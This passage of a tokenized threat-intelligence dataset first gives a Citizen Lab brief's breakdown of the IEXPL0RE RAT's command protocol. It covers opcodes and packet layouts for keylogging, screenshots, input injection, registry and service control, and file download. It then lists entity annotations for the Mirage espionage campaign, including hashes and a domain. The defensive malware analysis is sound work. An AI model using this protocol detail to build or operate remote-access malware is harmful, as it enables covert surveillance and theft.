["Sets", "the", "USERMODECMD", "event", "."], ["0x11"], ["Unknown"], ["S", "Reads", "a", "value", "out", "of", "%", "temp%/screenlog.txt", "."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on", "whether", "the", "value", "read", "equals", "1", "."], ["The", "command", "contains", ":"], ["[", "4", "]", "-", "Value"], ["Where", "value", "equals", ":", "0", ":", "file", "does", "not", "exist", "3", ":", "value", "read", "from", "file", "equals", "1", "4", ":", "value", "read", "from", "file", "equals", "0", "5", ":", "value", "read", "from", "file", "equals", "2", "0x12", "Unknown", "S"], ["Reads", "a", "value", "out", "of", "%", "temp%/offsoundlog.txt", "."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on", "whether", "the", "value", "read", "equals", "1", "."], ["The", "command", "contains", ":"], ["[", "4", "]", "-", "Value"], ["Where", "value", "equals", ":", "0", ":", "file", "does", "not", "exist", "3", ":", "value", "read", "from", "file", "equals", "1", "4", ":", "value", "read", "from", "file", "equals", "0", "5", ":", "value", "read", "from", "file", "equals", "2", "0x1E", "sub_10004603", "(", ")", "C", "If", "not", "empty", ",", "packet", "contains", ":"], ["[", "2", "]", "-", "_", "WIN32_FIND_DATAA", "structure", "length"], ["[", "var", "]", "-", "Data", "for", "file", "name"], ["If", "empty", ",", "packet", "contains", ":"], ["[", "2", "]", "-", "Set", "to", "0"], ["[", "1", "]", "-", "1", "if", "structure", "size", ">", "40000", ",", "0", "if", "failure"], ["Parameters", "are", "set", "to", "Res1", "/", "Res2", "."], ["20", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x20"], ["Move", "file", "S", "21", "Moves", "a", "file", "or", "directory", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Source", "length"], ["[", "var", "]", "-", "Source"], ["[", "4", "]", "-", "Destination", "length"], ["[", "var", "]", "-", "Destination", "Returns", "failure", "or", "success", "with", "parameters", "1", "/", "Res1", "0x21"], ["Delete", "file", "S", "Deletes", "a", "file", "or", "directory", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "File", "name", "length"], ["[", "var", "]", "-", "File", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2", "/", "Res1", "."], ["0x22"], ["Create", "directory", "S", "Creates", "a", "directory", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Path", "name", "length"], ["[", "var", "]", "-", "Path", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2", "/", "Res1", "."], ["0x23"], ["GetSystemInfo", "request", "S"], ["Requests", "client", "to", "send", "a", "0x24", "response", "with", "the", "output", "of", "GetSystemInfo", "(", ")", "."], ["0x24"], ["GetSystemInfo", "response", "C", "Contains", "a", "_", "SYSTEM_INFO", "struct", "with", "the", "output", "of", "GetSystemInfo", "(", ")", "."], ["0x26", "Get", "document", "paths", "S", "Gets", "paths", "for", "CSIDL", "special", "folders"], ["PERSONAL", "(", "My", "Documents", ")", ",", "DESKTOPDIRECTORY", "(", "Desktop", ")", ",", "and", "HISTORY", "(", "Internet", "history", ")", "."], ["Returns", "a", "success", "command", "containing", ":", "[", "4", "]", "-", "My", "Documents", "path", "length"], ["[", "var", "]", "-", "My", "Documents", "path"], ["[", "4", "]", "-", "Desktop", "path", "length"], ["[", "var", "]", "-", "Desktop", "path"], ["[", "4", "]", "-", "Internet", "history", "path", "length"], ["[", "var", "]", "-", "Internet", "history", "path"], ["Parameters", "are", "set", "to", "1", "/", "Res1", "."], ["0x29", "Move", "file", "or", "directory", "S", "Moves", "a", "file", "or", "directory", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Source", "length"], ["[", "var", "]", "-", "Source"], ["[", "4", "]", "-", "Destination", "length"], ["[", "var", "]", "-", "Destination", "Returns", "failure", "or", "success", "with", "parameters", "1", "/", "Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x2A"], ["Set", "file", "access", "time", "and", "attributes", "S", "22", "Sets", "the", "creation", "time", ",", "last", "access", "time", ",", "last", "write", "time", ",", "and", "file", "attributes", "of", "a", "file", "."], ["Packet", "contains", ":"], ["[", "8", "]", "-", "CreationTime"], ["[", "8", "]", "-", "LastAccessTime"], ["[", "8", "]", "-", "LastWriteTime"], ["[", "4", "]", "-", "dwFileAttributes"], ["[", "4", "]", "-", "File", "name", "length"], ["[", "var", "]", "-", "File", "name", "Returns", "failure", "or", "success", "with", "parameters", "Res2", "/", "Res1", "."], ["0x2B"], ["Unknown"], ["S", "Does", "some", "file", "-", "walking", ",", "including", "across", "all", "drives", "available", "(", "A", "to", "Z", ")", "."], ["Replies", "with", "a", "0x2C", "command", "followed", "by", "a", "number", "of", "0x2D", "commands", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Directory", "length"], ["[", "var", "]", "-", "Directory"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown", "0x2C"], ["Unknown", "start", "response", "C", "Response", "to", "the", "0x2B", "command", "."], ["Uses", "parameters", "Res2", "/", "Res1", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Number", "of", "0x2D", "packets", "to", "follow", "0x2D", "Unknown", "response", "C", "Response", "to", "the", "0x2B", "command", "."], ["Uses", "parameters", "Res2", "/", "Res1", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Unknown", "data", "length"], ["[", "var", "]", "-", "Unknown", "data", ",", "result", "of", "sub_10001B73", "(", ")", "0x2F", "Owner", "name", ",", "organization", ",", "and", "serial", "number", "request", "S", "0x46"], ["Read", "from", "file", "S", "0x47"], ["Read", "from", "file", "response", "C", "Sends", "the", "owner", "name", ",", "organization", ",", "and", "serial", "number", "."], ["Returns", "a", "success", "response", "with", "the", "following", "data", ":", "[", "4", "]", "-", "Username", "length"], ["[", "var", "]", "-", "Username"], ["[", "4", "]", "-", "User", "organization", "length"], ["[", "var", "]", "-", "User", "organization"], ["[", "4", "]", "-", "Serial", "length"], ["[", "var", "]", "-", "Serial"], ["Packet", "contains", ":"], ["[", "8", "]", "-", "File", "offset"], ["[", "2", "]", "-", "Characters", "to", "read", "[", "4", "]", "-", "Length", "of", "field", "3"], ["[", "var", "]", "-", "Field", "3"], ["Replies", "with", "a", "0x47", "packet", "containing", "data", "from", "a", "file", "."], ["Response", "to", "0x46", "that", "contains", "data", "from", "a", "file", "."], ["Sent", "with", "parameters", "2/2", "."], ["Packet", "contains", ":"], ["[", "2", "]", "-", "Size"], ["[", "var", "]", "-", "Data", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x4B"], ["List", "files", "S", "Lists", "files", "in", "a", "given", "directory", "along", "with", "file", "size", "and", "last", "write", "times", "."], ["Packet", "contains"], ["[", "4", "]", "-", "Directory", "length"], ["[", "var", "]", "-", "Directory", "0x4C", "Start", "of", "list", "files", "response", "C", "Start", "of", "list", "response", "to", "0x4B.", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4D"], ["End", "of", "list", "files", "response", "C"], ["End", "of", "list", "response", "to", "0x4B.", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4E", "List", "files", "response", "C", "List", "item", "for", "response", "to", "0x4B.", "Sent", "with", "parameters", "2/2", "."], ["Packet", "contains", ":"], ["[", "8", "]", "-", "FindFileData.nFileSizeLow", ",", "FindFileData.nFileSizeHigh"], ["[", "8", "]", "-", ".ftLastWriteTime.dwLowDateTime", ",", ".dwHighDateTime"], ["[", "4", "]", "-", "length", "of", "next", "field"], ["[", "var", "]", "-", "whole", "string", ":", "filename", "plus", "size", "and", "write", "time", "0x4F", "Open", "file", "S", "Opens", "a", "specified", "file", "for", "use", "with", "0x46", "[", "and", "friends", "]", "."], ["23", "Packet", "contains", ":"], ["[", "4", "]", "-", "File", "name", "length"], ["[", "var", "]", "-", "File", "name"], ["[", "4", "]", "-", "File", "mode", "length"], ["[", "var", "]", "-", "File", "mode"], ["Returns", "failure", "or", "success", "with", "parameters", "2/2", "."], ["0x50", "Close", "file", "S", "Closes", "file", "opened", "with", "0x4F", "command", "."], ["No", "response", "sent", "."], ["0x5A"], ["Start", "of", "running", "program", "list", "C", "Response", "to", "0x5D", "command", "that", "signals", "the", "start", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3", "/", "Res1", "."], ["0x5B"], ["End", "of", "running", "program", "list", "C", "0x5C"], ["Running", "program", "C", "Response", "to", "0x5D", "command", "that", "signals", "the", "end", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3", "/", "Res1", "."], ["Response", "to", "0x5D", "command", "that", "contains", "the", "first", "executable", "module", "for", "a", "single", "process", "."], ["One", "packet", "is", "sent", "per", "process", "."], ["Packet", "contains", ":"], ["[", "24", "]", "-", "PROCESSENTRY32.th32ProcessID"], ["[", "4", "]", "-", "length", "of", "executable", "module", "name"], ["[", "var", "]", "-", "length", "of", "executable", "module", "0x5D", "List", "running", "programs", "S", "Sends", "a", "list", "of", "executable", "names", "for", "running", "processes", "."], ["Replies", "with", "a", "0x5A", "response", ",", "followed", "with", "a", "0x5C", "packet", "for", "each", "executable", ",", "and", "ends", "with", "a", "0x5B", "response", "."], ["Client", "uses", "the", "CreateToolhelp32Snapshot", "(", ")", "API", "function", "followed", "by", "Process32First()/Process32Next", "(", ")", "to", "list", "all", "processes", "."], ["The", "executable", "name", "is", "the", "module", "name", "returned", "by", "Module32First", "(", ")", "."], ["0x5E"], ["Kill", "process", "S", "Kills", "a", "running", "process", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Process", "ID", "Returns", "failure", "or", "success", "with", "parameters", "3", "/", "Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x5F", "Run", "program", "S", "24", "Runs", "a", "program", "already", "present", "on", "the", "client", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Command", "line", "length"], ["[", "var", "]", "-", "Command", "line"], ["Returns", "success", "or", "failure", "with", "parameters", "3", "/", "Res1", "."], ["0x72"], ["Unknown", "-", "open", "connection", "B", "?"], ["S", "Creates", "multiple", "new", "threads", "and", "a", "new", "C2", "connection", "(", "via", "full", "handshake", ")", "with", "connection", "number", "11", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown", "value", "(", "if", "0", "<", "length", "<", "80000", ")"], ["Returns", "success", "or", "failure", "with", "parameters", "11/11", "."], ["If", "successful", ",", "contains", "the", "following", "payload", ":"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown", "(", "v2", "+", "808", ")"], ["[", "4", "]", "-", "Unknown", "value", "0x73", "Unknown", "-", "remove", "connection", "B", "?"], ["S", "May", "relate", "to", "uninstalling", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Process", "ID", "Kills", "the", "process", "with", "given", "process", "ID", ",", "and", "closes", "a", "socket", "."], ["Returns", "success", "or", "failure", "with", "parameters", "11/11", "."], ["If", "failure", ",", "contains", "the", "following", "payload", ":", "[", "4", "]", "-", "Process", "ID"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown", "(", "v2", "+", "808", ")", "0x82"], ["Number", "of", "services", "C", "Response", "to", "0x85", "command", "with", "the", "number", "of", "services", "on", "the", "system", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Number", "of", "services", "returned", "by", "EnumServicesStatusA", "(", ")"], ["Response", "parameters", "are", "5/5", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x84", "Service", "information", "C", "25", "Response", "to", "0x85", "command", "with", "details", "on", "a", "service", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Service", "handle"], ["[", "4", "]", "-", "Current", "state"], ["[", "4", "]", "-", "Start", "type"], ["[", "4", "]", "-", "Error", "control"], ["[", "4", "]", "-", "Length", "of", "service", "name"], ["[", "var", "]", "-", "Service", "name"], ["[", "4", "]", "-", "Length", "of", "service", "display", "name"], ["[", "var", "]", "-", "Service", "display", "name"], ["[", "4", "]", "-", "Length", "of", "service", "binary", "path"], ["[", "var", "]", "-", "Service", "binary", "path"], ["[", "4", "]", "-", "Length", "of", "service", "description"], ["[", "var", "]", "-", "Service", "description"], ["[", "4", "]", "-", "Length", "of", "service", "start", "name"], ["[", "var", "]", "-", "Service", "start", "name"], ["Response", "parameters", "are", "5/5", "."], ["0x85", "List", "services", "S", "Lists", "all", "services", "on", "the", "system", "."], ["Sends", "a", "0x82", "response", "with", "the", "number", "of", "services", ",", "then", "0x84", "responses", "with", "service", "details", "."], ["0x86"], ["Start", "service", "S", "Starts", "a", "service", "on", "the", "system", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Length", "of", "service", "name"], ["[", "var", "]", "-", "Service", "name"], ["Returns", "success", "with", "parameters", "5/5", "if", "service", "is", "started", "."], ["0x87", "Control", "service", "S", "Sends", "a", "control", "message", "to", "a", "service", "on", "the", "system", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Length", "of", "service", "name"], ["[", "var", "]", "-", "Service", "name"], ["[", "4", "]", "-", "Service", "control", "parameter"], ["Service", "control", "parameters", "are", ":", "1", "-", "stop", "2", "-", "pause", "3", "-", "continue"], ["Returns", "success", "with", "parameters", "5/5", "with", "the", "payload", ":", "[", "4", "]", "-", "Service", "current", "state", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x88", "Create", "service", "S", "26", "Creates", "a", "new", "service", "on", "the", "system", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Service", "name", "length"], ["[", "var", "]", "-", "Service", "name"], ["[", "4", "]", "-", "Display", "name", "length"], ["[", "var", "]", "-", "Display", "name", "(", "set", "in", "CreateServiceA", "(", ")", ")"], ["[", "4", "]", "-", "Binary", "path", "name", "length"], ["[", "var", "]", "-", "Binary", "path", "name"], ["[", "4", "]", "-", "Display", "name", "length"], ["[", "var", "]", "-", "Display", "name", "(", "set", "by", "ChangeServiceConfig2A", "(", ")", ")"], ["[", "4", "]", "-", "Start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", "."], ["If", "success", ",", "contains", "the", "following", "payload", ":", "[", "4", "]", "-", "Service", "handle"], ["[", "4", "]", "-", "Current", "state"], ["[", "4", "]", "-", "Start", "type"], ["[", "4", "]", "-", "Error", "control"], ["[", "4", "]", "-", "Length", "of", "service", "name"], ["[", "var", "]", "-", "Service", "name"], ["[", "4", "]", "-", "Length", "of", "service", "display", "name"], ["[", "var", "]", "-", "Service", "display", "name"], ["[", "4", "]", "-", "Length", "of", "service", "binary", "path"], ["[", "var", "]", "-", "Service", "binary", "path"], ["[", "4", "]", "-", "Length", "of", "service", "description"], ["[", "var", "]", "-", "Service", "description"], ["[", "4", "]", "-", "Length", "of", "service", "start", "name"], ["[", "var", "]", "-", "Service", "start", "name", "0x89", "Delete", "service", "S", "Deletes", "a", "service", "from", "the", "system", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Service", "name", "length"], ["[", "var", "]", "-", "Service", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", "."], ["0x8A"], ["Set", "service", "options", "S", "Changes", "the", "display", "name", "and", "start", "type", "of", "a", "service", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Service", "name", "length"], ["[", "var", "]", "-", "Service", "name"], ["[", "4", "]", "-", "Display", "name", "length"], ["[", "var", "]", "-", "Display", "name", "(", "max", "256", "chars", ")"], ["[", "4", "]", "-", "Display", "name", "length"], ["[", "var", "]", "-", "Display", "name", "(", "max", "512", "chars", ")"], ["[", "4", "]", "-", "Service", "start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5", "/", "Res2", "0x96", "Enumerate", "registry", "keys", "S", "Opens", "a", "registry", "key", "and", "enumerates", "its", "subkeys", "."], ["Replies", "with", "an", "0x97", "packet", "with", "subkey", "information", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x97", "Enumerate", "registry", "keys", "response", "C", "27", "Contains", "a", "list", "of", "all", "the", "subkey", "names", "for", "a", "given", "registry", "key", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Number", "of", "subkeys", "(", "N", ")"], ["[", "var", ",", "N", "times", "]", ":", "[", "4", "]", "-", "Subkey", "name", "length"], ["[", "var", "]", "-", "Subkey", "name"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x98"], ["Registry", "key", "last", "write", "time", "query", "S"], ["Requests", "the", "last", "write", "time", "on", "a", "specified", "registry", "key", "and", "returns", "the", "information", "in", "a", "0x99", "packet", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name", "0x99"], ["Registry", "key", "last", "write", "time", "response", "C"], ["Contains", "the", "last", "write", "time", "of", "a", "registry", "key", "."], ["Packet", "contains", ":"], ["[", "8", "]", "-", "Last", "write", "time", "(", "_", "FILETIME", "structure", ")"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9A"], ["Enumerate", "registry", "key", "values", "S", "Opens", "a", "registry", "key", "and", "enumerates", "its", "values", "."], ["Replies", "with", "a", "0x9B", "packet", "with", "the", "number", "of", "values", "and", "maximum", "size", "values", "."], ["Sends", "a", "0x9C", "packet", "for", "each", "value", ",", "then", "signifies", "the", "end", "of", "the", "list", "with", "a", "0x9D", "packet", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name", "0x9B"], ["Start", "of", "registry", "key", "value", "enumeration", "list", "C", "Response", "to", "the", "0x9A", "command", "signifying", "the", "start", "of", "a", "registry", "key", "value", "enumeration", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Number", "of", "values", "associated", "with", "the", "registry", "key"], ["[", "4", "]", "-", "Max", "value", "name", "length"], ["[", "4", "]", "-", "Max", "value", "length", "Parameters", "are", "set", "to", "6/6", "."], ["0x9C"], ["Registry", "key", "value", "enumeration", "item", "C", "Response", "to", "the", "0x9A", "command", "signifying", "a", "registry", "key", "value", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Type"], ["[", "4", "]", "-", "Value", "name", "size"], ["[", "var", "]", "-", "Value", "name"], ["[", "4", "]", "-", "Value", "data", "size"], ["[", "var", "]", "-", "Value", "data"], ["Parameters", "are", "set", "to", "6/6", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x9D"], ["End", "of", "registry", "key", "value", "enumeration", "list", "C", "Response", "to", "the", "0x9A", "command", "signifying", "the", "end", "of", "a", "registry", "key", "value", "enumeration", "."], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9F"], ["Delete", "registry", "key", "value", "S", "Deletes", "a", "value", "from", "a", "registry", "key", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["[", "4", "]", "-", "Registry", "key", "value", "length"], ["[", "var", "]", "-", "Registry", "key", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA0"], ["Change", "registry", "key", "value", "S", "Changes", "a", "value", "of", "a", "registry", "key", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["[", "4", "]", "-", "Registry", "key", "old", "value", "length"], ["[", "var", "]", "-", "Registry", "key", "old", "value"], ["[", "4", "]", "-", "Registry", "key", "new", "value", "length"], ["[", "var", "]", "="], ["Registry", "key", "new", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA1"], ["Create", "empty", "registry", "key", "value", "S", "Creates", "a", "registry", "key", "value", "of", "a", "specified", "type", "with", "no", "value", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["[", "4", "]", "-", "Registry", "key", "value", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "value", "name"], ["[", "4", "]", "-", "Registry", "key", "value", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA2"], ["Create", "registry", "key", "S", "Creates", "a", "registry", "key", "."], ["Can", "be", "a", "subkey", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", ".", "28", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0xA3"], ["Set", "registry", "key", "type", "and", "value", "S", "Sets", "a", "registry", "key", "type", "and", "value", "."], ["Packet", "always", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["[", "4", "]", "-", "Registry", "value", "name", "length"], ["[", "var", "]", "-", "Registry", "value", "name"], ["[", "4", "]", "-", "Registry", "value", "type"], ["The", "value", "then", "can", "take", "a", "different", "form", "based", "on", "the", "value", "type", "."], ["Value", "type", "0", "(", "empty", "):", "No", "payload", "."], ["Value", "type", "1", "(", "REG_SZ", ",", "null", "terminated", "string", "):"], ["[", "4", "]", "-", "Registry", "value", "length"], ["[", "var", "]", "-", "Registry", "value", "Value", "type", "3", "(", "REG_BINARY", ",", "raw", "binary", "data", "):", "[", "4", "]", "-", "Registry", "value", "length"], ["[", "var", "]", "-", "Registry", "value"], ["Value", "type", "4", "(", "REG_DWORD", ",", "double", "word", "):", "[", "4", "]", "-", "Registry", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xA4"], ["NOP", "S", "Does", "nothing", "."], ["Possibly", "an", "unimplemented", "or", "deleted", "function", "."], ["0xA5"], ["Delete", "registry", "key", "S", "Deletes", "a", "registry", "key", "."], ["Can", "be", "a", "subkey", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Registry", "key", "name", "length"], ["[", "var", "]", "-", "Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xB6"], ["Keylogger", "response", "C", "Sends", "keylogger", "data", "from", "the", "keylogger", "buffer", "file", "."], ["Keylogger", "data", ":"], ["[", "4", "]", "-", "Length"], ["[", "1", "]", "-", "All", "bytes", "read", "?", "1", "or", "0"], ["[", "var", "]", "-", "Keylogger", "data", "Parameters", "are", "set", "to", "the", "output", "of", "function", "4", "in", "the", "class", "C", "vtable", "?"], ["0xB8"], ["Keylogger", "data", "request", "S"], ["Requests", "keylogger", "data", "in", "a", "0xB6", "packet", "."], ["29", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0xC8"], ["Unknown", "-", "get", "a", "screenshot", "?"], ["S", "30", "Looks", "suspiciously", "like", "taking", "a", "screenshot", "."], ["Packet", "contains", ":"], ["[", "2", "]", "-", "Unknown"], ["[", "2", "]", "-", "Unknown"], ["[", "1", "]", "-", "Unknown"], ["Replies", "with", "failure", "or", "success", "with", "parameters", "8/8", "."], ["If", "success", ",", "contains", "the", "following", "fields", ":"], ["[", "2", "]", "-", "Monitor", "width", "size", "(", "X", ")", "in", "pixels", "[", "2", "]", "-", "Monitor", "height", "size", "(", "Y", ")", "in", "pixels", "[", "4", "]", "-", "Unknown", "[", "4", "]", "-", "Unknown", "size", "(", "screenshot", "?", ")"], ["[", "var", "]", "-", "Unknown", "(", "screenshot", "?", ")"], ["0xCA", "Send", "keyboard", "or", "mouse", "event", "S", "Packet", "contains", ":"], ["[", "4", "]", "-", "Unknown"], ["[", "4", "]", "-", "Extra", "information", "for", "keybd_event", "or", "mouse_event"], ["[", "4", "]", "-", "Flags", "for", "keybd_event", "or", "mouse_event"], ["[", "4", "]", "-", "Vk", "for", "keybd_event"], ["[", "4", "]", "-", "x", "coordinate", "for", "mouse", "or", "Vk", "for", "keyboard"], ["[", "4", "]", "-", "y", "coordinate", "for", "mouse"], ["[", "4", "]", "-", "Data", "for", "mouse", "event", "0xCB"], ["Downloads", "a", "file"], ["S", "Downloads", "a", "file", "to", "%", "temp%\\off.dll", "."], ["Packet", "contains", ":"], ["[", "2", "]", "-", "Unknown"], ["[", "2", "]", "-", "Unknown"], ["[", "2", "]", "-", "Unknown"], ["[", "4", "]", "-", "Data", "length"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown"], ["[", "4", "]", "-", "Unknown", "length"], ["[", "var", "]", "-", "Unknown"], ["[", "4", "]", "-", "File", "data", "length"], ["[", "var", "]", "-", "File", "data"], ["Writes", "log", "information", "on", "the", "size", "of", "the", "downloaded", "file", "to", "c:\\aaa\\ccc.txt", "."]]}, {"vertexSet": [[{"name": "Mirage", "pos": [1, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "Dell SecureWorks Counter Threat Unit", "pos": [8, 13], "sent_id": 0, "type": "Organization"}], [{"name": "Mirage", "pos": [33, 34], "sent_id": 2, "type": "TrojanHorse"}], [{"name": "MirageFox", "pos": [38, 39], "sent_id": 2, "type": "TrojanHorse"}], [{"name": "high-profile oil company", "pos": [6, 11], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "Phillipines", "pos": [13, 14], "sent_id": 3, "type": "Country"}], [{"name": "military organization", "pos": [16, 18], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "Taiwan", "pos": [19, 20], "sent_id": 3, "type": "Country"}], [{"name": "energy company", "pos": [22, 24], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "Canada", "pos": [25, 26], "sent_id": 3, "type": "Country"}], [{"name": "Brazil", "pos": [34, 35], "sent_id": 3, "type": "Country"}], [{"name": "Israel", "pos": [36, 37], "sent_id": 3, "type": "Country"}], [{"name": "Egypt", "pos": [38, 39], "sent_id": 3, "type": "Country"}], [{"name": "Nigeria", "pos": [40, 41], "sent_id": 3, "type": "Country"}], [{"name": "spearphishing email", "pos": [18, 20], "sent_id": 5, "type": "Exploit"}], [{"name": "senior-level executives", "pos": [26, 30], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Mirage", "pos": [15, 16], "sent_id": 6, "type": "Malware"}], [{"name": "Mirage", "pos": [19, 20], "sent_id": 9, "type": "TrojanHorse"}], [{"name": "ce1cdc9c95a6808945f54164b2e4d9d2", "pos": [13, 14], "sent_id": 10, "type": "MD5"}], [{"name": "Yemeni Women can participate in politics just like men, says President Saleh", "pos": [34, 47], "sent_id": 10, "type": "File"}], [{"name": "Mirage", "pos": [5, 6], "sent_id": 15, "type": "TrojanHorse"}], [{"name": "svchost.exe", "pos": [0, 1], "sent_id": 18, "type": "File"}], [{"name": "ernel32.dll", "pos": [1, 2], "sent_id": 18, "type": "File"}], [{"name": "thumb.db", "pos": [2, 3], "sent_id": 18, "type": "File"}], [{"name": "csrss.exe", "pos": [0, 1], "sent_id": 19, "type": "File"}], [{"name": "Reader_SL.exe", "pos": [1, 2], "sent_id": 19, "type": "File"}], [{"name": "MSN.exe", "pos": [2, 3], "sent_id": 19, "type": "File"}], [{"name": "Mirage", "pos": [4, 5], "sent_id": 20, "type": "TrojanHorse"}], [{"name": "JKDDOS", "pos": [13, 14], "sent_id": 20, "type": "MalwareFamily"}], [{"name": "CPU speed", "pos": [4, 6], "sent_id": 22, "type": "SystemInformation"}], [{"name": "memory size", "pos": [7, 9], "sent_id": 22, "type": "SystemInformation"}], [{"name": "system name", "pos": [10, 12], "sent_id": 22, "type": "SystemInformation"}], [{"name": "username", "pos": [13, 14], "sent_id": 22, "type": "SystemInformation"}], [{"name": "HTTP request", "pos": [10, 12], "sent_id": 24, "type": "MalwareCharacteristics"}], [{"name": "Mirage", "pos": [8, 9], "sent_id": 40, "type": "Malware"}], [{"name": "Mjtdkj", "pos": [18, 19], "sent_id": 40, "type": "Indicator"}], [{"name": "MAC address", "pos": [8, 10], "sent_id": 41, "type": "SystemInformation"}], [{"name": "CPU information", "pos": [11, 13], "sent_id": 41, "type": "SystemInformation"}], [{"name": "Mirage", "pos": [4, 5], "sent_id": 51, "type": "Malware"}], [{"name": "HTTP GET", "pos": [6, 8], "sent_id": 51, "type": "MalwareCharacteristics"}], [{"name": "Lingbo", "pos": [5, 6], "sent_id": 60, "type": "MalwareFamily"}], [{"name": "fa26f410d0133f4152ea78df3978c22", "pos": [33, 34], "sent_id": 73, "type": "MD5"}], [{"name": "Taiwan", "pos": [8, 9], "sent_id": 91, "type": "Country"}], [{"name": "Philippines", "pos": [11, 12], "sent_id": 91, "type": "Country"}], [{"name": "Nigeria", "pos": [18, 19], "sent_id": 91, "type": "Country"}], [{"name": "Brazil", "pos": [20, 21], "sent_id": 91, "type": "Country"}], [{"name": "Israel", "pos": [22, 23], "sent_id": 91, "type": "Country"}], [{"name": "Canada", "pos": [24, 25], "sent_id": 91, "type": "Country"}], [{"name": "Egypt", "pos": [26, 27], "sent_id": 91, "type": "Country"}], [{"name": "dynamic domain name system", "pos": [7, 11], "sent_id": 99, "type": "Exploit"}], [{"name": "HTran", "pos": [0, 1], "sent_id": 103, "type": "Software"}], [{"name": "HUC", "pos": [25, 26], "sent_id": 105, "type": "AttackerGroup"}], [{"name": "asia-online.us", "pos": [16, 17], "sent_id": 124, "type": "Indicator"}], 